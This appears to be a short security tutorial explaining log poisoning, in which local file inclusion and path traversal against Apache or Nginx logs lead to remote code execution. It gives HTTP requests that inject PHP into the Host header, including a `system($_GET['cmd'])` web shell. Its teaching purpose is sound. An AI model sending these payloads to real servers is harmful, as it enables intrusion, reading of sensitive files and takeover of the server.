Log poisoning is a vulnerability that is caused by local file inclusion where an attacker is able to view the contents of the log file and modify the value of HTTP headers, such as `Host`, `User-Agent`, `Cookie`, etc. to write arbitrary code and achieve remote code execution on the server.
> Note: This same exploit can also be used on web servers running Nginx.
## Identification
The goal on this part is to identify which HTTP header is returning the results of our arbitrary commands, we can to this by fuzzing each HTTP request header.
```http
GET /blog.php?page=../../../../var/log/apache2/error.log
Host: target-website.com
User-Agent: Log Poisoning
Cookie: Log Poisoning
Referer: Log Poisoning
```
## Sample Exploit
For example, imagine an application that returns a `.php` page by reading the `page` parameter
```http
GET /blog.php?page=hello-world.php
Host: target-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```
We can exploit this by chaining path traversal and local file inclusion to view the log file:
```http
GET /blog.php?page=../../../../var/log/apache2/error.log
Host: target-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```
Notice that in the log file, the `Host` HTTP header is displayed. Therefore, we will attempt remote code execution to view the contents of a sensitive file or upload a shell to gain full control of the server.
```http
GET /blog.php?page=../../../../var/log/apache2/error.log
Host: <?php system('ls /etc/passwd') ?>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```
```http
GET /blog.php?page=../../../../var/log/apache2/error.log&cmd=id
Host: <?php system($_GET['cmd']) ?>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```
> Note: We can also use a reverse shell.